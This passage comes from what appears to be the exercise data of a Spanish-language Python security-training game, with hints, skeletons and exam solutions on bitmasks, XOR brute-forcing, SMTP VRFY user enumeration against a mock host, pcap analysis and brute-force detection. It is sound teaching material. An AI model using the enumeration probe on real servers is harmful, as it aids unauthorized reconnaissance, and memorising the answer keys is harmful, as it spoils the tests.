      "4) Activa el bit de write para OTHERS con OR (resultado debería ser 0o753) e " +
      "imprime el resultado en octal con f\"{x:o}\".",
    hint:
      'permisos = 0o751\nprint(f"binario: {permisos:09b}")\n\nowner_x = bool(permisos & 0o100)\nprint(f"owner-x: {owner_x}")\n\nothers_w = bool(permisos & 0o002)\nprint(f"others-w: {others_w}")\n\nnuevos = permisos | 0o002\nprint(f"con others-w activado: {nuevos:o}")',
    strategy:
      "PASO 1 — La variable permisos = 0o751 ya está en el starter. El\n" +
      "         prefijo 0o significa OCTAL. 0o751 en decimal es 489, en\n" +
      "         binario es 111101001 (9 bits = 3 grupos de 3).\n" +
      "         Cada grupo de 3 bits son los permisos de owner / group /\n" +
      "         others. Bit alto a bajo: r-w-x.\n" +
      "\n" +
      "PASO 2 — Imprimir en binario con padding:\n" +
      "             print(f\"binario: {permisos:09b}\")\n" +
      "         El format spec :09b significa: tipo b (binario), ancho\n" +
      "         total 9 caracteres, rellenando con 0 a la izquierda.\n" +
      "\n" +
      "PASO 3 — Comprobar bit owner-x con AND y máscara:\n" +
      "         - Máscara para owner-x: 0o100 (bit 6 desde el bajo).\n" +
      "         - permisos & 0o100 da:\n" +
      "             > 0 si el bit está activo\n" +
      "             0 si no.\n" +
      "         - bool(...) lo convierte a True/False legible.\n" +
      "         Imprime: \"owner-x: True/False\".\n" +
      "\n" +
      "PASO 4 — Idem para others-w con máscara 0o002. Otra comprobación\n" +
      "         con AND y otro bool().\n" +
      "\n" +
      "PASO 5 — Activar el bit others-w: usa OR con la máscara.\n" +
      "             nuevos = permisos | 0o002\n" +
      "         OR con la máscara FUERZA ese bit a 1, sin tocar el resto.\n" +
      "         Imprime el resultado en octal con format spec :o.\n" +
      "         Si pones :o, no aparece el prefijo 0o — solo los dígitos.\n" +
      "\n" +
      "PASO 6 — Cuidado importante: NO confundas & con and, ni | con or.\n" +
      "         and/or son lógicos (devuelven booleanos según truthiness).\n" +
      "         &/| son bitwise (devuelven enteros). Aquí necesitas los\n" +
      "         bitwise.",
    skeleton:
      'permisos = 0o751   # 111 101 001 binario = rwxr-x--x\n' +
      '\n' +
      '# 1) Imprimir en binario con padding (9 bits, ceros a la izq)\n' +
      'print(f"binario: {permisos:[TODO: format spec - 09 chars binario]}")\n' +
      '\n' +
      '# 2) ¿Owner tiene permiso execute? Máscara 0o100, AND bitwise\n' +
      'owner_x = bool(permisos [TODO: operador AND bitwise] 0o100)\n' +
      'print(f"owner-x: {owner_x}")\n' +
      '\n' +
      '# 3) ¿Others tiene permiso write? Máscara 0o002\n' +
      'others_w = bool(permisos [TODO: operador AND bitwise] 0o002)\n' +
      'print(f"others-w: {others_w}")\n' +
      '\n' +
      '# 4) Activar bit others-w con OR. Resultado debería ser 0o753\n' +
      'nuevos = permisos [TODO: operador OR bitwise] 0o002\n' +
      'print(f"con others-w activado: {nuevos:[TODO: format spec - octal]}")',
    starterCode:
      '# Permisos UNIX como entero octal. Misión en el briefing.\n\npermisos = 0o751\n\n',
    win: { mustPrint: true, mustPrintMin: 4 },
    requires: [
      { type: 'mustContain', regex: /&/, message: "Usa el operador AND bitwise (&)" },
      { type: 'mustContain', regex: /\|/, message: "Usa el operador OR bitwise (|)" },
    ],
  },

  {
    id: 35, chapter: 5,
    title: "Evaluación: descifrar comunicación",
    location: "Sala de evaluaciones · captura cifrada",
    concept: "EVALUACIÓN — combo cripto",
    is_exam: true,
    is_checkpoint: true,
    intro:
      "\"Mensaje en pipeline doble: primero base64, luego XOR con clave de 1 byte. " +
      "Encuéntralo. Sin pista.\"",
    outro:
      "Cap 5 cerrado. Próximo: red y protocolos.",
    diary:
      "Día 35. Quinto examen. Pipeline base64 → XOR. La clave es probar todas y " +
      "filtrar por output legible.",
    mission:
      "Mensaje interceptado:\n\n" +
      "  cipher_b64 = \"VkhPdkN3RkRWUDFFRDA9PQ==\"\n\n" +
      "(En realidad ese b64 está mal a propósito — el real es el del solution.)\n\n" +
      "Pipeline: el remitente hizo XOR de byte único, después base64. Para descifrar:\n\n" +
      "1) base64-decode → bytes.\n" +
      "2) Itera las 256 claves XOR posibles.\n" +
      "3) Aplica XOR a los bytes con cada clave.\n" +
      "4) Filtra los candidatos que sean 100% ASCII imprimible.\n" +
      "5) Imprime los candidatos válidos con su clave (ej: \"key=0xNN: TEXTO\").\n\n" +
      "RESTRICCIONES:\n" +
      "• Máximo 18 líneas\n" +
      "• Debes usar import base64 e import hashlib (este último para registrar el md5 " +
      "del plaintext final).\n" +
      "• Debes usar el operador XOR (^).\n" +
      "• Debes definir al menos una función con def.",
    hint: "Evaluación sin pista.",
    solution:
      'import base64, hashlib\n\ndef try_xor(data, key):\n    return bytes(b ^ key for b in data)\n\ncipher_b64 = "Hh0fHCQUGRsdGRwIBjkUCRMRDw=="\nraw = base64.b64decode(cipher_b64)\nfor k in range(256):\n    out = try_xor(raw, k)\n    if all(32 <= c < 127 for c in out):\n        text = out.decode()\n        h = hashlib.md5(out).hexdigest()\n        print(f"key=0x{k:02x}: {text} (md5={h[:8]})")',
    starterCode:
      '# EVALUACIÓN — Capítulo 5\n\ncipher_b64 = "Hh0fHCQUGRsdGRwIBjkUCRMRDw=="\n\n',
    win: { mustPrint: true },
    restrictions: [
      { type: 'maxLines', value: 18, message: "Máximo 18 líneas" },
      { type: 'mustContain', regex: /\bimport\s+base64\b/, message: "Importa base64" },
      { type: 'mustContain', regex: /\bimport\s+hashlib\b|,\s*hashlib\b/, message: "Importa hashlib" },
      { type: 'mustContain', regex: /\^/, message: "Usa XOR (^)" },
      { type: 'mustContain', regex: /\bdef\s+\w+/, message: "Define al menos una función" },
    ],
  },

  // ============================================================
  // CAPÍTULO 6 — RED Y PROTOCOLOS (36-40)
  // ============================================================
  {
    id: 36, chapter: 6,
    title: "Sockets simulados",
    location: "Sentinel · acercamiento bajo nivel",
    concept: "socket_request — payload TCP simulado",
    is_checkpoint: true,
    intro:
      "\"Hasta ahora has hablado HTTP. Bajo HTTP hay TCP. PyHack te da socket_request " +
      "(host, port, payload) que simula 'envía esto al puerto y dame lo que responda'. " +
      "Te sirve para protocolos que no hablan HTTP: SMTP, FTP, custom binary, etc.\"",
    outro:
      "Comunicación TCP raw simulada.",
    diary:
      "Día 36. socket_request es un atajo educativo — la API real es socket.socket() + " +
      "connect + send + recv. Pero la idea es la misma: 'envío bytes, recibo bytes'.",
    mission:
      "El servicio en \"smtp.acme.local:25\" es un SMTP simulado. Si le envías la " +
      "string \"HELO sentinel.local\\r\\n\", responde con un código y mensaje.\n\n" +
      "1) Llama socket_request(\"smtp.acme.local\", 25, \"HELO sentinel.local\\r\\n\").\n" +
      "2) Imprime la respuesta.\n" +
      "3) Después manda \"VRFY admin\\r\\n\" (verificación de usuario, antiguo SMTP).\n" +
      "4) Imprime la respuesta. Si contiene \"250\" → \"VULN: VRFY habilitado (info disclosure)\".",
    hint:
      'r = socket_request("smtp.acme.local", 25, "HELO sentinel.local\\r\\n")\nprint("HELO:", r)\n\nr = socket_request("smtp.acme.local", 25, "VRFY admin\\r\\n")\nprint("VRFY:", r)\nif "250" in (r or ""):\n    print("VULN: VRFY habilitado (info disclosure)")',
    strategy:
      "PASO 1 — socket_request(host, port, payload) es el equivalente\n" +
      "         educativo de socket.connect + send + recv. Manda el\n" +
      "         payload (string), recibe la respuesta (string).\n" +
      "\n" +
      "PASO 2 — SMTP es un protocolo de líneas separadas por \\r\\n. El\n" +
      "         cliente saluda con \"HELO dominio.tld\\r\\n\". El servidor\n" +
      "         responde con código + texto.\n" +
      "         Llama: socket_request(host, port, \"HELO sentinel.local\\r\\n\").\n" +
      "         Imprime la respuesta para ver el formato.\n" +
      "\n" +
      "PASO 3 — VRFY es un comando antiguo de SMTP que verifica si un\n" +
      "         usuario existe. Si está habilitado en producción, expone\n" +
      "         info útil para enumeración. Manda: \"VRFY admin\\r\\n\".\n" +
      "\n" +
      "PASO 4 — Si la respuesta del servidor empieza con código 250 (es\n" +
      "         decir, contiene la string \"250\"), VRFY está habilitado\n" +
      "         para ese usuario. Eso es un hallazgo defensivo: lo reportas\n" +
      "         para que el dev del cliente lo deshabilite.\n" +
      "         IMPORTANTE: socket_request puede devolver None si el puerto\n" +
      "         no responde. Usa `r or \"\"` para protegerte de ese caso\n" +
      "         antes de hacer `in`.",
    skeleton:
      '# Saludo SMTP — protocolo de líneas terminadas en \\r\\n\n' +
      'r = socket_request("smtp.acme.local", 25, [TODO: payload "HELO sentinel.local\\r\\n"])\n' +
      'print("HELO:", r)\n' +
      '\n' +
      '# VRFY: comando legacy que pregunta si un usuario existe\n' +
      'r = socket_request("smtp.acme.local", 25, "VRFY admin\\r\\n")\n' +
      'print("VRFY:", r)\n' +
      '\n' +
      '# Si el servidor responde 250 (OK), VRFY está habilitado\n' +
      '# `r or ""` protege contra None\n' +
      'if "250" [TODO: operador "está dentro de"] (r or ""):\n' +
      '    print("VULN: VRFY habilitado (info disclosure)")',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true, mustPrintMin: 2 },
    requires: [
      { type: 'mustContain', regex: /\bsocket_request\s*\(/, message: "Usa socket_request(...)" },
    ],
    targets: {
      "smtp.acme.local": {
        note: "ACME · servidor SMTP",
        ports: {
          25: {
            status: "open",
            service: "SMTP",
            banner: "220 smtp.acme.local ESMTP Postfix",
            socket_handler: (payload) => {
              const p = String(payload || "");
              if (p.startsWith("HELO")) return "250 smtp.acme.local Hello, pleased to meet you\r\n";
              if (p.startsWith("VRFY admin")) return "250 admin <admin@acme.local>\r\n";
              if (p.startsWith("VRFY")) return "550 No such user here\r\n";
              if (p.startsWith("QUIT")) return "221 Bye\r\n";
              return "500 Command unrecognized\r\n";
            },
          },
        },
      },
    },
  },

  {
    id: 37, chapter: 6,
    title: "Análisis de captura",
    location: "SOC · pcap del incidente",
    concept: "Parseo de paquetes (parse_pcap)",
    intro:
      "\"El equipo blue team te pasa una captura del tráfico durante un incidente. " +
      "Lo simulamos como una lista de paquetes JSON. parse_pcap() devuelve una lista " +
      "de dicts con src_ip, dst_ip, src_port, dst_port, protocol, length, payload " +
      "(opcional).\"",
    outro:
      "Captura procesada.",
    diary:
      "Día 37. Lista de paquetes como dicts. Filtrar y agrupar con Python básico. " +
      "Más adelante con scapy o pyshark sería lo mismo pero contra binarios reales.",
    mission:
      "1) parse_pcap() te da los paquetes.\n" +
      "2) Cuenta cuántos hay en total.\n" +
      "3) Cuenta cuántos son TCP y cuántos UDP.\n" +
      "4) Encuentra la IP destino que más tráfico recibe (más paquetes). Imprímela.\n" +
      "5) Imprime cuántos paquetes únicos van entre el par más activo (src→dst).",
    hint:
      'pkts = parse_pcap()\nprint(f"Total: {len(pkts)}")\nprint(f"TCP: {sum(1 for p in pkts if p[\'protocol\'] == \'TCP\')}")\nprint(f"UDP: {sum(1 for p in pkts if p[\'protocol\'] == \'UDP\')}")\n\nfrom collections import Counter\ndst_counts = Counter(p["dst_ip"] for p in pkts)\ntop_dst = dst_counts.most_common(1)[0]\nprint(f"Top destino: {top_dst[0]} ({top_dst[1]} paquetes)")\n\npairs = Counter((p["src_ip"], p["dst_ip"]) for p in pkts)\ntop_pair = pairs.most_common(1)[0]\nprint(f"Par activo: {top_pair[0][0]} -> {top_pair[0][1]} ({top_pair[1]} paquetes)")',
    strategy:
      "PASO 1 — parse_pcap() devuelve lista de dicts. Cada paquete tiene\n" +
      "         src_ip, dst_ip, src_port, dst_port, protocol, length.\n" +
      "         Guárdalo en pkts.\n" +
      "\n" +
      "PASO 2 — Total: len(pkts).\n" +
      "\n" +
      "PASO 3 — Contar por protocolo: usa sum() con un generador booleano.\n" +
      "         Cada True cuenta como 1.\n" +
      "             sum(1 for p in pkts if p[\"protocol\"] == \"TCP\")\n" +
      "         Alternativa más Pythónica: Counter(p[\"protocol\"] for p\n" +
      "         in pkts) — pero el sum/generator también vale.\n" +
      "\n" +
      "PASO 4 — Top destino: importa Counter. Construye un counter sobre\n" +
      "         dst_ip. .most_common(1) devuelve una LISTA con el top-1\n" +
      "         como tupla (ip, count). [0] coge la primera entrada.\n" +
      "\n" +
      "PASO 5 — Par activo: Counter sobre TUPLAS (src, dst). Las tuplas\n" +
      "         son hashables — válidas como clave de Counter.\n" +
      "             Counter((p[\"src_ip\"], p[\"dst_ip\"]) for p in pkts)\n" +
      "         most_common(1)[0] da ((src, dst), count).\n" +
      "\n" +
      "PASO 6 — Imprime cada hallazgo con f-string. El destino y el par\n" +
      "         activo te dan visibilidad rápida sobre dónde va el tráfico.",
    skeleton:
      'pkts = parse_pcap()\n' +
      'print(f"Total: {len(pkts)}")\n' +
      '\n' +
      '# Contar por protocolo: cada True suma 1\n' +
      'print(f"TCP: {sum(1 for p in pkts if p[\'protocol\'] == [TODO: string TCP])}")\n' +
      'print(f"UDP: {sum(1 for p in pkts if p[\'protocol\'] == \'UDP\')}")\n' +
      '\n' +
      'from collections import Counter\n' +
      '\n' +
      '# Top destino: Counter sobre dst_ip, .most_common(1) -> [(ip, n)]\n' +
      'dst_counts = Counter(p["dst_ip"] for p in pkts)\n' +
      'top_dst = dst_counts.[TODO: método top-N](1)[0]\n' +
      'print(f"Top destino: {top_dst[0]} ({top_dst[1]} paquetes)")\n' +
      '\n' +
      '# Par activo: Counter sobre TUPLAS (src, dst) — son hashables\n' +
      'pairs = Counter([TODO: tupla (src_ip, dst_ip) para cada paquete])\n' +
      'top_pair = pairs.most_common(1)[0]\n' +
      'print(f"Par activo: {top_pair[0][0]} -> {top_pair[0][1]} ({top_pair[1]} paquetes)")',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true, mustPrintMin: 4 },
    requires: [
      { type: 'mustContain', regex: /\bparse_pcap\s*\(/, message: "Usa parse_pcap()" },
    ],
    pcap: [
      { src_ip: "10.0.0.5",  dst_ip: "10.0.0.20", src_port: 51234, dst_port: 80,  protocol: "TCP", length: 152 },
      { src_ip: "10.0.0.5",  dst_ip: "10.0.0.20", src_port: 51234, dst_port: 80,  protocol: "TCP", length: 480 },
      { src_ip: "10.0.0.20", dst_ip: "10.0.0.5",  src_port: 80,    dst_port: 51234, protocol: "TCP", length: 1500 },
      { src_ip: "10.0.0.5",  dst_ip: "8.8.8.8",   src_port: 5353,  dst_port: 53,  protocol: "UDP", length: 64 },
      { src_ip: "8.8.8.8",   dst_ip: "10.0.0.5",  src_port: 53,    dst_port: 5353, protocol: "UDP", length: 96 },
      { src_ip: "10.0.0.5",  dst_ip: "10.0.0.20", src_port: 51235, dst_port: 443, protocol: "TCP", length: 220 },
      { src_ip: "10.0.0.5",  dst_ip: "10.0.0.20", src_port: 51235, dst_port: 443, protocol: "TCP", length: 1440 },
      { src_ip: "10.0.0.20", dst_ip: "10.0.0.5",  src_port: 443,   dst_port: 51235, protocol: "TCP", length: 1500 },
      { src_ip: "10.0.0.20", dst_ip: "10.0.0.5",  src_port: 443,   dst_port: 51235, protocol: "TCP", length: 800 },
      { src_ip: "10.0.0.99", dst_ip: "10.0.0.20", src_port: 60000, dst_port: 22,  protocol: "TCP", length: 60, note: "ssh login attempt" },
    ],
  },

  {
    id: 38, chapter: 6,
    title: "HTTP a mano",
    location: "Sentinel · entender la pila",
    concept: "Construir un GET HTTP/1.1 sin librería",
    intro:
      "\"requests/fetch_url te abstraen el protocolo. Para entender cómo es por " +
      "debajo, vas a construir un request HTTP a mano y enviarlo por socket. Saber qué " +
      "te abstrae la librería es la diferencia entre depurar errores en 5 minutos o en " +
      "5 horas.\"",
    outro:
      "Request HTTP construido a bytes.",
    diary:
      "Día 38. HTTP es texto. Request line + headers + \\r\\n + (opcional) body. El " +
      "servidor responde con la misma estructura. Una vez vista esto desnuda, requests " +
      "se entiende mejor.",
    mission:
      "El host \"web.acme.local:80\" tiene un servicio HTTP que responde a requests " +
      "construidos manualmente. Construye un request GET HTTP/1.1 válido y envíalo via " +
      "socket_request:\n\n" +
      "  GET / HTTP/1.1\\r\\n\n" +
      "  Host: web.acme.local\\r\\n\n" +
      "  User-Agent: Sentinel/1.0\\r\\n\n" +
      "  \\r\\n\n\n" +
      "1) Construye el string del request.\n" +
      "2) socket_request → respuesta cruda.\n" +
      "3) Imprime la respuesta.\n" +
      "4) Parte la respuesta por \"\\r\\n\\r\\n\" para separar headers y body. " +
      "Imprime solo el body.",
    hint:
      'req = "GET / HTTP/1.1\\r\\nHost: web.acme.local\\r\\nUser-Agent: Sentinel/1.0\\r\\n\\r\\n"\nresp = socket_request("web.acme.local", 80, req)\nprint("RAW:")\nprint(resp)\n\nheaders, _, body = resp.partition("\\r\\n\\r\\n")\nprint("\\nBODY:")\nprint(body)',
    strategy:
      "PASO 1 — Concepto: HTTP por debajo es solo TEXTO. Vas a construir\n" +
      "         un request a mano, mandarlo por socket, y parsear la\n" +
      "         respuesta. Lo que hace requests automáticamente.\n" +
      "\n" +
      "PASO 2 — Estructura de un request HTTP/1.1:\n" +
      "             GET / HTTP/1.1\\r\\n     ← request line\n" +
      "             Host: web.acme.local\\r\\n  ← headers\n" +
      "             User-Agent: Sentinel/1.0\\r\\n\n" +
      "             \\r\\n                 ← LÍNEA VACÍA = fin de headers\n" +
      "         La línea vacía final es OBLIGATORIA. Sin ella el servidor\n" +
      "         espera más headers y se queda colgado.\n" +
      "\n" +
      "PASO 3 — Construye el string del request literal con todos los\n" +
      "         \\r\\n. Asígnalo a una variable req.\n" +
      "\n" +
      "PASO 4 — socket_request(\"web.acme.local\", 80, req). Devuelve la\n" +
      "         respuesta cruda como string: status line + headers +\n" +
      "         línea vacía + body.\n" +
      "\n" +
      "PASO 5 — Para separar headers de body, usa el método partition:\n" +
      "             headers, sep, body = resp.partition(\"\\r\\n\\r\\n\")\n" +
      "         partition divide en 3 partes: lo de antes, el separador,\n" +
      "         lo de después. Con _ ignoras el separador.\n" +
      "\n" +
      "PASO 6 — Imprime el RAW para ver el formato completo. Después\n" +
      "         imprime solo el body.",
    skeleton:
      '# Request HTTP/1.1 manual. La línea vacía final es OBLIGATORIA.\n' +
      'req = (\n' +
      '    "GET / HTTP/1.1\\r\\n"\n' +
      '    "Host: [TODO: web.acme.local]\\r\\n"\n' +
      '    "User-Agent: Sentinel/1.0\\r\\n"\n' +
      '    "\\r\\n"   # línea vacía = fin de headers\n' +
      ')\n' +
      '\n' +
      'resp = socket_request("web.acme.local", 80, req)\n' +
      'print("RAW:")\n' +
      'print(resp)\n' +
      '\n' +
      '# partition divide en (antes, separador, después)\n' +
      '# _ es convención Python para "no me interesa este valor"\n' +
      'headers, _, body = resp.[TODO: método partition con \\r\\n\\r\\n]("\\r\\n\\r\\n")\n' +
      'print("\\nBODY:")\n' +
      'print(body)',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true, mustPrintMin: 2 },
    requires: [
      { type: 'mustContain', regex: /\bsocket_request\s*\(/, message: "Usa socket_request" },
      { type: 'mustContain', regex: /HTTP\/1\.[01]/i, message: "El request debe especificar HTTP/1.0 o HTTP/1.1" },
      { type: 'mustContain', regex: /Host:/i, message: "Incluye el header Host:" },
    ],
    targets: {
      "web.acme.local": {
        ports: {
          80: {
            status: "open",
            service: "HTTP",
            banner: "Apache/2.4.41",
            socket_handler: (payload) => {
              const p = String(payload || "");
              if (!/^GET\s+\/\s+HTTP\/1\.[01]/.test(p)) {
                return "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
              }
              const body = "<html><body><h1>ACME corporate site</h1><p>Welcome.</p></body></html>";
              return "HTTP/1.1 200 OK\r\nServer: Apache/2.4.41\r\nContent-Type: text/html\r\nContent-Length: " + body.length + "\r\n\r\n" + body;
            },
          },
        },
      },
    },
  },

  {
    id: 39, chapter: 6,
    title: "Detección de anomalías",
    location: "SOC · revisión de patrones",
    concept: "Análisis estadístico básico de tráfico",
    intro:
      "\"En una captura grande, lo importante son los patrones que se salen de la " +
      "norma. Volumen, frecuencia, IPs raras, puertos inusuales. Aquí buscas la IP " +
      "que dispara más conexiones a puertos típicos de servicios sensibles (SSH, " +
      "MySQL).\"",
    outro:
      "Anomalía identificada.",
    diary:
      "Día 39. Este pcap incluye una IP que está martillando puerto 22 desde fuera. " +
      "Probable bruteforce SSH. Patrones así son lo que un IDS detecta. Reglar: " +
      "una IP nueva con muchas conexiones a 22/3389 = sospecha automática.",
    mission:
      "1) parse_pcap()\n" +
      "2) Filtra los paquetes con dst_port en [22, 3389, 3306] (servicios sensibles).\n" +
      "3) Cuenta cuántos de esos paquetes vienen de cada src_ip distinta.\n" +
      "4) Imprime: \"src_ip → N intentos a servicios sensibles\" para cada uno.\n" +
      "5) Si alguna IP tiene > 10 intentos, imprime: \"ALERTA: posible bruteforce desde X\".",
    hint:
      'from collections import Counter\nSENSIBLES = {22, 3389, 3306}\npkts = parse_pcap()\n\nsensibles = [p for p in pkts if p["dst_port"] in SENSIBLES]\ncounts = Counter(p["src_ip"] for p in sensibles)\nfor ip, n in counts.most_common():\n    print(f"{ip}: {n} intentos a servicios sensibles")\n\nfor ip, n in counts.items():\n    if n > 10:\n        print(f"ALERTA: posible bruteforce desde {ip}")',
    strategy:
      "PASO 1 — Define un SET con los puertos sensibles: SSH (22), RDP\n" +
      "         (3389), MySQL (3306). Set en lugar de lista para que el\n" +
      "         test `in` sea O(1) (rápido aunque haya muchos puertos).\n" +
      "             SENSIBLES = {22, 3389, 3306}\n" +
      "\n" +
      "PASO 2 — parse_pcap() para coger los paquetes.\n" +
      "\n" +
      "PASO 3 — Filtra: solo los paquetes cuyo dst_port esté en SENSIBLES.\n" +
      "         List comprehension con `if p[\"dst_port\"] in SENSIBLES`.\n" +
      "\n" +
      "PASO 4 — Cuenta cuántos paquetes sensibles tiene cada src_ip:\n" +
      "             counts = Counter(p[\"src_ip\"] for p in sensibles)\n" +
      "\n" +
      "PASO 5 — Imprime la tabla de IPs con sus conteos. .most_common()\n" +
      "         sin argumento devuelve TODOS, ordenados de mayor a menor.\n" +
      "\n" +
      "PASO 6 — Detección: itera counts.items(). Si el contador supera 10\n" +
      "         para una IP, imprime ALERTA. La regla \"más de 10 intentos\n" +
      "         a un puerto sensible desde la misma IP\" es la heurística\n" +
      "         clásica de detección de bruteforce.\n" +
      "\n" +
      "RECORDATORIO — Esta detección es lo MISMO que un IDS hace por ti:\n" +
      "         filtrar tráfico por criterio, agregar por origen, alertar\n" +
      "         cuando supera threshold.",
    skeleton:
      'from collections import Counter\n' +
      '\n' +
      '# Set para test `in` rápido (O(1))\n' +
      'SENSIBLES = [TODO: set con 22, 3389, 3306]\n' +
      '\n' +
      'pkts = parse_pcap()\n' +
      '\n' +
      '# Solo los paquetes que van a un puerto sensible\n' +
      'sensibles = [p for p in pkts if p["dst_port"] [TODO: operador "está en"] SENSIBLES]\n' +
      '\n' +
      '# Contar por IP origen\n' +
      'counts = Counter(p["src_ip"] for p in sensibles)\n' +
      '\n' +
      'for ip, n in counts.most_common():\n' +
      '    print(f"{ip}: {n} intentos a servicios sensibles")\n' +
      '\n' +
      '# Alertar si supera el threshold\n' +
      'for ip, n in counts.items():\n' +
      '    if n [TODO: comparador estricto mayor] 10:\n' +
      '        print(f"ALERTA: posible bruteforce desde {ip}")',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true, mustPrintMin: 2 },
    requires: [
      { type: 'mustContain', regex: /\bparse_pcap\s*\(/, message: "Usa parse_pcap" },
      { type: 'mustContain', regex: /\b(22|3389|3306)\b/, message: "Filtra por puertos sensibles (22, 3389, 3306)" },
      { type: 'mustContain', regex: /\bif\b/, message: "Filtra con un if" },
    ],
    pcap: [
      ...(() => {
        const arr = [];
        for (let i = 0; i < 14; i++) {
          arr.push({ src_ip: "203.0.113.5", dst_ip: "10.0.0.20", src_port: 50000 + i, dst_port: 22, protocol: "TCP", length: 64 });
        }
        for (let i = 0; i < 3; i++) {
          arr.push({ src_ip: "10.0.0.5", dst_ip: "10.0.0.30", src_port: 51000 + i, dst_port: 3306, protocol: "TCP", length: 200 });
        }
        for (let i = 0; i < 8; i++) {
          arr.push({ src_ip: "10.0.0.5", dst_ip: "10.0.0.40", src_port: 52000 + i, dst_port: 80, protocol: "TCP", length: 1500 });
        }
        return arr;
      })(),
    ],
  },

  {
    id: 40, chapter: 6,
    title: "Evaluación: análisis completo",
    location: "Sala de evaluaciones · pcap real",
    concept: "EVALUACIÓN — análisis estructurado de pcap",
    is_exam: true,
    is_checkpoint: true,
    intro:
      "\"Reporte completo de la captura. Function-based, dict-based, JSON al final.\"",
    outro:
      "Cap 6 cerrado. Próximo: post-explotación + Bash.",
    diary:
      "Día 40. Sexto examen. Análisis pcap como pipeline limpio. Se siente como código " +
      "que mostraría sin vergüenza en una review.",
    mission:
      "Genera un reporte con:\n\n" +
      "  • total_packets\n" +
      "  • protocols: dict {protocol: count}\n" +
      "  • top_talkers: top-3 src_ip por nº de paquetes (lista de tuplas)\n" +
      "  • suspicious: lista de src_ip con >5 intentos a puerto 22\n\n" +
      "Imprime el reporte como JSON con indent=2.\n\n" +
      "RESTRICCIONES:\n" +
      "• Máximo 22 líneas\n" +
      "• Debes definir al menos una función con def\n" +
      "• Debes usar collections.Counter\n" +
      "• Debes usar json",
    hint: "Evaluación sin pista.",
    solution:
      'import json\nfrom collections import Counter\n\ndef analizar(pkts):\n    by_proto = Counter(p["protocol"] for p in pkts)\n    talkers = Counter(p["src_ip"] for p in pkts).most_common(3)\n    ssh_attempts = Counter(p["src_ip"] for p in pkts if p["dst_port"] == 22)\n    suspicious = [ip for ip, n in ssh_attempts.items() if n > 5]\n    return {\n        "total_packets": len(pkts),\n        "protocols": dict(by_proto),\n        "top_talkers": talkers,\n        "suspicious": suspicious,\n    }\n\nreporte = analizar(parse_pcap())\nprint(json.dumps(reporte, indent=2))',
    starterCode:
      '# EVALUACIÓN — Capítulo 6\n# Análisis pcap completo + reporte JSON\n\n',
    win: { mustPrint: true },
    restrictions: [
      { type: 'maxLines', value: 22, message: "Máximo 22 líneas" },
      { type: 'mustContain', regex: /\bdef\s+\w+/, message: "Define al menos una función" },
      { type: 'mustContain', regex: /\bCounter\b/, message: "Usa collections.Counter" },
      { type: 'mustContain', regex: /\bjson\b/, message: "Usa json para el reporte final" },
    ],
    pcap: [
      { src_ip: "203.0.113.5", dst_ip: "10.0.0.20", src_port: 50000, dst_port: 22, protocol: "TCP", length: 64 },
      { src_ip: "203.0.113.5", dst_ip: "10.0.0.20", src_port: 50001, dst_port: 22, protocol: "TCP", length: 64 },
      { src_ip: "203.0.113.5", dst_ip: "10.0.0.20", src_port: 50002, dst_port: 22, protocol: "TCP", length: 64 },
      { src_ip: "203.0.113.5", dst_ip: "10.0.0.20", src_port: 50003, dst_port: 22, protocol: "TCP", length: 64 },
      { src_ip: "203.0.113.5", dst_ip: "10.0.0.20", src_port: 50004, dst_port: 22, protocol: "TCP", length: 64 },
      { src_ip: "203.0.113.5", dst_ip: "10.0.0.20", src_port: 50005, dst_port: 22, protocol: "TCP", length: 64 },
      { src_ip: "203.0.113.5", dst_ip: "10.0.0.20", src_port: 50006, dst_port: 22, protocol: "TCP", length: 64 },
      { src_ip: "10.0.0.5", dst_ip: "8.8.8.8", src_port: 5353, dst_port: 53, protocol: "UDP", length: 64 },
      { src_ip: "10.0.0.5", dst_ip: "10.0.0.40", src_port: 51001, dst_port: 80, protocol: "TCP", length: 1500 },
      { src_ip: "10.0.0.5", dst_ip: "10.0.0.40", src_port: 51002, dst_port: 80, protocol: "TCP", length: 1200 },
      { src_ip: "10.0.0.5", dst_ip: "10.0.0.40", src_port: 51003, dst_port: 443, protocol: "TCP", length: 1480 },
      { src_ip: "10.0.0.99", dst_ip: "10.0.0.30", src_port: 60001, dst_port: 3306, protocol: "TCP", length: 80 },
    ],
  },

  // ============================================================
  // CAPÍTULO 7 — FORENSE Y RESPUESTA A INCIDENTES (41-46)
  // Lab simulado. Filesystem virtual + bash mock. El host está bajo
  // investigación: triage, hashing, parsing de logs, timeline, reporte.
  // ============================================================
  {
    id: 41, chapter: 7,
    title: "Triage inicial del host",
    location: "Host bajo investigación · acme-int-01",
    concept: "bash() — comandos read-only para identificar la máquina",
    is_checkpoint: true,
    intro:
      "\"Te llaman como forense. Una máquina del lab interno está aislada de la " +
      "red, esperando análisis. Lo primero, antes de tocar nada: identificarla. " +
      "PyHack te da bash(cmd) que devuelve un objeto con .stdout, .stderr y " +
      ".returncode — equivalente educativo de subprocess.run en modo lectura.\"",
    outro:
      "Identidad del host registrada. Esto va a la cabecera del reporte.",
    diary:
      "Día 41. bash() es un mock. Real sería subprocess.run([cmd], " +
      "capture_output=True, text=True). Misma estructura. La regla del forense: " +
      "antes de mirar logs, anota qué máquina es y cuándo aterrizaste.",
    mission:
      "Llegas a la máquina aislada. Antes de nada, triage básico:\n\n" +
      "1) bash(\"whoami\") — bajo qué usuario corre tu proceso de análisis.\n" +
      "2) bash(\"id\") — UIDs y grupos.\n" +
      "3) bash(\"uname -a\") — sistema operativo y kernel.\n" +
      "4) bash(\"pwd\") — directorio actual.\n\n" +
      "Para cada uno, imprime el comando y luego su .stdout en líneas separadas.",
    hint:
      'for cmd in ["whoami", "id", "uname -a", "pwd"]:\n    r = bash(cmd)\n    print(f"$ {cmd}")\n    print(r.stdout)',
    strategy:
      "PASO 1 — bash(cmd) ejecuta un comando shell mockeado. Devuelve un\n" +
      "         BashResult con .stdout, .stderr, .returncode. Es el\n" +
      "         equivalente educativo de:\n" +
      "             subprocess.run(cmd, capture_output=True, text=True)\n" +
      "\n" +
      "PASO 2 — La lista de comandos ya está en el starter. No la redefinas.\n" +
      "\n" +
      "PASO 3 — Para cada comando:\n" +
      "         a) Llama bash(cmd). Guarda el resultado en r.\n" +
